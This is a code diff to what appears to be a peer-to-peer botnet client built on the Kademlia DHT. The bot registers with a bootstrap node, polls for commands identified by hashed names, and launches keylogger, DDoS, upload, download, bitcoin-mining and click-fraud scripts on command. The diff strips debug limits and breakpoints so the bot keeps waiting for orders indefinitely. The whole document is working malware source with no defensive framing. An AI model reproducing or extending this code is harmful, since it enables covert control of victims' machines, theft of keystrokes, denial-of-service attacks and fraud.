@@ -13,7 +13,7 @@ formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(messag
 handler.setFormatter(formatter)
 log = logging.getLogger('kademlia')
 log.addHandler(handler)
-log.setLevel(logging.DEBUG)
+#log.setLevel(logging.WARN) #DEBUG
 
 
 if len(sys.argv) != 4:
@@ -60,55 +60,59 @@ Block the command from being run again.
 Return to wait_cmd() loop and check for new commands
 """
 async def get_cmd(value, server, bot):
-    print("\nCommand to run is {}\n".format(value))
     #The bot needs to check the recived command ID (hashed) from the commander, then sets its value to true and performs the works
-    hashCommands = [get_hash(command) for command in bot.cmdsrun.keys()]
-    print("Hashes of the command dict is {}".format(hashCommands))
+    hashcmds = [get_hash(command) for command in bot.cmdsrun.keys()]
+    #print("\nTrying to find {} in {}\n".format(value,hashcmds))
     try:
-        x = value.split()
-        cnt = int(x[0])  # parse out the command count
-        cmd = x[1]  
-        print("\nCMD TO RUN {}\n".format(cmd))
-        if cmd in hashCommands and cnt > bot.cmdcnt:
+        
+        args = value.split()
+        cnt = len(args)  # parse out the command count
+        #cnt=len(args)
+        cmd = args[0]
+        print("\nRUNNING CMD: {}\nCMD CNT: {}\nTotal CMDS:{}".format(cmd,cnt,bot.cmdcnt))
+  
+        if cmd in hashcmds and cnt > bot.cmdcnt:
             bot.cmdcnt += 1
-            if cmd == 'KEYLOG':
+            if cmd == get_hash('KEYLOG'):
                 if bot.cmdsrun['KEYLOG'] is False:
                     tmp = 'python keylogger.py {0}'.format(bot.cmdkey)
                     print("Starting keylogger")
                     process = subprocess.Popen(tmp.split(), shell=False)
                     bot.pgroup.append(process)
                     bot.cmdsrun['KEYLOG'] = True
-            if cmd == 'DDOS':
+            if cmd == get_hash('DDOS'):
                 if bot.cmdsrun['DDOS'] is False:
-                    tmp = 'python ddos.py {0}'.format(' '.join(x[1:]))
+                    tmp = 'python ddos.py {0}'.format(' '.join(args[1:]))
                     print("Starting DDOS on {0}".format(tmp))
                     process = subprocess.Popen(tmp.split(), shell=False)
                     bot.cmdsrun['DDOS'] = True
-            if cmd == 'UPLOAD':
-                tmp = 'python upload.py {0}'.format(' '.join(x[1:]))
+            if cmd == get_hash('UPLOAD'):
+                tmp = 'python upload.py {0}'.format(' '.join(args[1:]))
                 print("Starting upload on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(), shell=False)
-
-            if cmd == 'DOWNLOAD':
-                tmp = 'python download.py {0}'.format(' '.join(x[1:]))
+            if cmd == get_hash('DOWNLOAD'):
+                tmp = 'python download.py {0}'.format(' '.join(args[1:]))
                 print("Starting DOWNLOAD on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(), shell=False)
-            if cmd == 'BITCOIN':
-                tmp = 'python mine.py {0}'.format(' '.join(x[1:]))
+            if cmd == get_hash('BITCOIN'):
+                tmp = 'python mine.py {0}'.format(' '.join(args[1:]))
                 print("Starting BITCOING MINING on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(), shell=False)
-            if cmd == 'CLICKFRAUD':
-                tmp = 'python clickFraud.py {0}'.format(' '.join(x[1:]))
+            if cmd == get_hash('CLICKFRAUD'):
+                tmp = 'python clickFraud.py {0}'.format(' '.join(args[1:]))
                 print("Starting CLICKFRAUD on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(), shell=False)
-            if cmd == 'HELLO':
-                tmp = 'python sayHello.py {0}'.format(' '.join(x[1:]))
+            if cmd == get_hash('HELLO'):
+                tmp = 'python sayHello.py {0}'.format(' '.join(args[1:]))
                 print("Starting Hello program on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(),shell=False)
     except Exception as e:
+        #log.error()
+        print("\nCaught Exception {}".format(e))
+        print("We errored out trying to match command {} {}\n".format(type(cmd),cmd))
         pass
     #pdb.set_trace()
-    await wait_cmd(server, bot)
+    #await wait_cmd(server, bot)
 
 
 """
@@ -120,7 +124,7 @@ async def wait_cmd(server, bot):
     print("Checking for command")
     numcalls = 0
     checkCommands = await server.get(bot.cmdkey)
-    while checkCommands is None and numcalls < 5: #set max calls to 5 for debugging 
+    while checkCommands is None: #and numcalls < 5: #set max calls to 5 for debugging 
         print("\nNO COMMAND FOR ME WAITING")
         checkCommands = await server.get(bot.cmdkey)
         await asyncio.sleep(5)
@@ -146,7 +150,6 @@ async def callhome(server, bot):
         print("No ack for {}".format(nodeId))
         await server.set(NETKEY, str(bot.id))
         await asyncio.sleep(5)
-        
         await callhome(server,bot)
     else:    
         print("\nWe have an ack\nNode: {} has joined {}\n\n"
@@ -170,7 +173,7 @@ async def setup(server):
 
     print("\nParams: NETWORK_KEY {}\nIP: {}\nNODE_ID: {}\nCOMMAND KEY: {}"
         .format(NETKEY, myip, server.node.long_id, cmdhash))
-    print("\nBOT CREATED? CHECK THESE VARS:\n{}\n\n".format(vars(bot)))
+    #print("\nBOT CREATED?: CHECK THESE VARS:\n{}\n\n".format(vars(bot)))
     #pdb.set_trace()
     await callhome(server, bot)
 
@@ -179,10 +182,12 @@ async def setup(server):
 async def bootstrapDone(server):
     result = await server.get(NETKEY) #keyhash - Might need to pass in keyhash instead. 
     if result is None:
+        loop.run_until_complete(server.bootstrap([(bootstrap_ip, bootstrap_port)]))
         server.stop()
         loop.close()
         print("\nKey is: ",result, "\n\nBootstrapper down: machine has not joined network\n")
     print("\nAble to fetch key as result:",result, type(result))
+    return result
     
 
 #SERVER ACTUALLY STARTS HERE
@@ -201,7 +206,7 @@ server = Server()
 loop.run_until_complete(server.listen(myport))
 loop.run_until_complete(server.bootstrap([(bootstrap_ip, bootstrap_port)]))
 #loop.run_until_complete(bootstrapDone(server, key))
-pdb.set_trace()
+#pdb.set_trace()
 try:
     #asyncio.ensure_future(bootstrapDone(server)) ## Getting some errors here, need to troubleshoot, but this is just a check to see if we on network. Callhome kinda does similar thing so might not be needed
     asyncio.ensure_future(setup(server))
